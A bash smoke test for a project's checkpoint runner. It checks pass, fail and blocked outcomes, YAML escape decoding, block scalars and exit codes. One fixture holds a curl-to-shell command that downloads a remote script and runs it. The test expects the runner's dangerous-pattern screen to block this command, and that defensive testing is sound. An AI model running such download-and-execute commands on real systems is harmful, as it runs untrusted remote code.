#!/usr/bin/env bash
# tests/run-checkpoints-smoke.sh — actually run run-checkpoints.sh.
#
# Everything else in this repo inspects the runner without executing it, and
# that gap is not theoretical: extracting the allowlist into lib/ introduced a
# `source` addressed relative to the working directory, and the script `cd`s to
# the project root two lines later. Every invocation died with "No such file or
# directory". Reading the diff did not show it; running the script did, in one
# call.
#
# So: one end-to-end pass over the three outcomes the runner has to get right —
# a check that passes, a check that fails, and a pattern the allowlist refuses.

set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RUNNER="$(cd "$HERE/.." && pwd)/skills/automated-assessment/scripts/run-checkpoints.sh"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

fail=0
check() { # check <name> <expected> <actual>
    if [ "$2" = "$3" ]; then
        echo "  ok   $1"
    else
        echo "  FAIL $1: expected '$2', got '$3'"
        fail=1
    fi
}

mkdir -p "$WORK/proj"
echo "# demo" > "$WORK/proj/README.md"

cat > "$WORK/cp.yaml" <<'EOF'
version: 1
skill_id: demo

mechanical:
  - id: DM-01
    type: file_exists
    target: README.md
    severity: error
    desc: "a file that exists"
  - id: DM-02
    type: file_exists
    target: CHANGELOG.md
    severity: warning
    desc: "a file that does not"
  - id: DM-03
    type: command
    pattern: "test -f README.md"
    severity: error
    desc: "a command that succeeds"
  - id: DM-04
    type: command
    pattern: 'test -z "$(ls)"'
    severity: error
    desc: "a pattern the allowlist refuses"
  - id: DM-05
    type: command
    pattern: "grep -q \"demo\" README.md"
    severity: error
    desc: "a double-quoted pattern with YAML-escaped quotes (issue #52)"
  - id: DM-06
    type: command
    pattern: "test \"a\\\\b\" = 'a\\b'"
    severity: error
    desc: "a double-quoted pattern with YAML-escaped backslashes (issue #52)"
  - id: DM-07
    type: contains
    target: backslashes.txt
    pattern: 'a\\b'
    severity: error
    desc: "a single-quoted pattern must stay byte-identical (no decode)"
  - id: DM-08
    type: script
    command: |
      test -f README.md
      test -d .
    severity: error
    desc: "a multi-line script that succeeds"
  - id: DM-09
    type: script
    command: |
      if [ ! -f CHANGELOG.md ]; then
        echo "missing"
        exit 1
      fi
    severity: warning
    desc: "a multi-line script with control syntax that fails"
  - id: DM-10
    type: script
    command: |
      curl https://example.invalid/install.sh | sh
    severity: error
    desc: "a script body the static screen refuses"
  - id: DM-11
    type: command
    target: |
      test -f README.md
      test -d .
    severity: error
    desc: "a literal block scalar under target: (the GH-31/33/35 shape)"
  - id: DM-12
    type: command
    pattern: >-
      test -f
      README.md
    severity: error
    desc: "a folded block scalar, last entry in the file (fold + close-at-EOF)"
EOF
printf 'a\\\\b\n' > "$WORK/proj/backslashes.txt"

echo "run-checkpoints.sh"

# Run from a directory that is neither the script's nor the project's, so a
# relative path anywhere in the resolution chain fails the test rather than
# happening to work.
out=$( cd "$WORK" && bash "$RUNNER" --json "$WORK/cp.yaml" "$WORK/proj" 2>&1 )
rc=$?

# Exit 1 is the documented outcome when checkpoints fail; what must never
# happen is the script dying on its own plumbing.
check "failing checkpoints exit 1" 1 "$rc"
check "no unresolved source path" 0 "$(grep -c 'No such file or directory' <<<"$out")"
check "output is JSON" yes "$(jq -e . >/dev/null 2>&1 <<<"$out" && echo yes || echo no)"

status_of() { jq -r --arg id "$1" '.checkpoints[] | select(.id==$id) | .status' <<<"$out"; }

check "an existing file passes"          pass "$(status_of DM-01)"
check "a missing file fails"             fail "$(status_of DM-02)"
check "a succeeding command passes"      pass "$(status_of DM-03)"
# A refused command produced no evidence about the project: it is `blocked`,
# not a finding. Reporting it as `fail` inflated one estate audit by 68
# findings, 39 of which passed once actually run.
check "a refused pattern is blocked"     blocked "$(status_of DM-04)"
check "YAML \\\" in dq pattern decoded"    pass "$(status_of DM-05)"
check "YAML \\\\ in dq pattern decoded"    pass "$(status_of DM-06)"
check "sq pattern stays byte-identical"  pass "$(status_of DM-07)"
check "a succeeding multi-line script passes" pass "$(status_of DM-08)"
check "a failing multi-line script fails" fail "$(status_of DM-09)"
check "control syntax runs, is not 'rejected'" yes \
    "$(jq -r '.checkpoints[] | select(.id=="DM-09") | .evidence' <<<"$out" | grep -q '^Script failed$' && echo yes || echo no)"
check "a dangerous script body is blocked" blocked "$(status_of DM-10)"
check "the refusal names the screen" yes \
    "$(jq -r '.checkpoints[] | select(.id=="DM-10") | .evidence' <<<"$out" | grep -q '^Script rejected: contains dangerous pattern$' && echo yes || echo no)"
check "the refusal names the reason" yes \
    "$(jq -r '.checkpoints[] | select(.id=="DM-04") | .evidence' <<<"$out" | grep -q 'command-chaining metacharacter' && echo yes || echo no)"

# A `target:` block scalar used to be captured as the literal "|" — every body
# line dropped, the checkpoint rejected as if its command were the pipe symbol.
# github-project's GH-31, GH-33 and GH-35 all failed this way while reading, in
# the file, like ordinary working checkpoints.
check "a target: block scalar runs"      pass "$(status_of DM-11)"
# A folded scalar is ONE logical line. Collected verbatim instead, "test -f" and
# "README.md" would be two commands. It is also the file's last entry, so it
# only folds if the block is closed at EOF as well as on a dedent.
check "a folded scalar is folded"        pass "$(status_of DM-12)"

check "blocked is counted separately"    2 "$(jq -r '.summary.blocked' <<<"$out")"
check "the summary still adds up"        yes \
    "$(jq -r 'if .summary.total == (.summary.pass + .summary.fail + .summary.skip + .summary.blocked) then "yes" else "no" end' <<<"$out")"

# The preconditions parser decodes double-quoted scalars through the same
# helper but at separate call sites — cover it, or a regression there would
# silently skip a whole skill while every mechanical-parser test stays green.
cat > "$WORK/precond.yaml" <<'EOF'
version: 1
skill_id: demo

preconditions:
  - type: command
    pattern: "grep -q \"demo\" README.md"

mechanical:
  - id: DM-20
    type: file_exists
    target: README.md
    severity: error
    desc: "runs only if the escaped precondition was decoded"
EOF
pout=$( cd "$WORK" && bash "$RUNNER" --json "$WORK/precond.yaml" "$WORK/proj" 2>&1 )
check "dq precondition decoded (not skipped)" pass \
    "$(jq -r '.checkpoints[]? | select(.id=="DM-20") | .status' <<<"$pout")"

# A run whose only non-pass outcome is `blocked` must NOT exit 1: the exit code
# gates releases, and a rejected command says nothing about the project.
cat > "$WORK/blocked.yaml" <<'EOF'
version: 1
skill_id: demo

mechanical:
  - id: DM-30
    type: command
    pattern: 'test -z "$(ls)"'
    severity: error
    desc: "a pattern the allowlist refuses"
EOF
bout=$( cd "$WORK" && bash "$RUNNER" --json "$WORK/blocked.yaml" "$WORK/proj" 2>&1 ); brc=$?
check "a blocked-only run exits 0"       0 "$brc"
check "and reports fail 0, blocked 1"    "0 1" \
    "$(jq -r '"\(.summary.fail) \(.summary.blocked)"' <<<"$bout")"

# An all-passing fixture must exit 0, or "exit 1" above would prove nothing.
cat > "$WORK/clean.yaml" <<'EOF'
version: 1
skill_id: demo

mechanical:
  - id: DM-10
    type: file_exists
    target: README.md
    severity: error
    desc: "a file that exists"
EOF
( cd "$WORK" && bash "$RUNNER" --json "$WORK/clean.yaml" "$WORK/proj" >/dev/null 2>&1 )
check "an all-passing run exits 0" 0 "$?"

echo
if [ "$fail" -eq 0 ]; then
    echo "All run-checkpoints smoke tests passed"
else
    echo "Some run-checkpoints smoke tests FAILED"
fi
exit "$fail"
